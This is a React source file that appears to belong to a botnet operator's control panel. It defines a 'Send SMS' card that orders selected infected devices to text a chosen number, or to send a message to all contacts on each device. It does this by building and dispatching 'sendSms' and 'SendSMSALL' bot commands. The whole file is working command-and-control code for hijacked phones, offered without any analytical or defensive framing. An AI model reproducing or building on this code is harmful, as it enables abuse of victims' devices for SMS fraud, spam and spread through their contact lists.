import React from 'react';
import SettingsContext from '../../Settings';


//Отправка СМС - {"this":"~command~","name":"sendSms","number":"+123456789","text":"hi bro!"}
class SendSMS extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          phone: '',
          text: ''
        }
    }

    onChangePhone = (e) => {
        this.setState({ 
            phone: e.target.value.substring(0,40)
        });
    }

    onChangeText = (e) => {
        this.setState({ 
            text: e.target.value
        });
    }


    onClickSendSMSALL = (e) => {
        if(SettingsContext.BotsSelected()) {
            if(this.state.text.length < 1) {
                SettingsContext.ShowToastTitle("warning", "SMS", "Please fill text");
                return;
            };
            SettingsContext.BotSendCommand('{"name":"SendSMSALL", "text":"' + this.state.text + '"}');
            this.setState({ 
                phone: '',
                text: ''
            });
            SettingsContext.ShowToastTitle("info", "SMS", "Please wait while the bots confirm the command");
        }
    }

    onClickSendSMS = (e) => {
        if(SettingsContext.BotsSelected()) {
            if(this.state.phone.length < 1) {
                SettingsContext.ShowToastTitle("warning", "SMS", "Please fill phone");
                return;
            }
            if(this.state.text.length < 1) {
                SettingsContext.ShowToastTitle("warning", "SMS", "Please fill text");
                return;
            }
            SettingsContext.BotSendCommand('{"name":"sendSms","number":"' + this.state.phone + '","text":"' + this.state.text + '"}');
            this.setState({ 
                phone: '',
                text: ''
            });
            SettingsContext.ShowToastTitle("info", "SMS", "Please wait while the bots confirm the command");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Send sms</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Send sms from selected bots. <br />
                    Please fill only text for send sms to all contacts</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.phone} onChange={this.onChangePhone} placeholder="Phone number +1..." />
                        <input class="margintop5px form-control" value={this.state.text} onChange={this.onChangeText} placeholder="SMS Text" />
                    </p>
                    <button type="button" onClick={this.onClickSendSMS} class="btn btn-right btn-outline-success">Send SMS</button>
                    <button type="button" onClick={this.onClickSendSMSALL} class="btn btn-left btn-outline-success">Send SMS to all</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default SendSMS;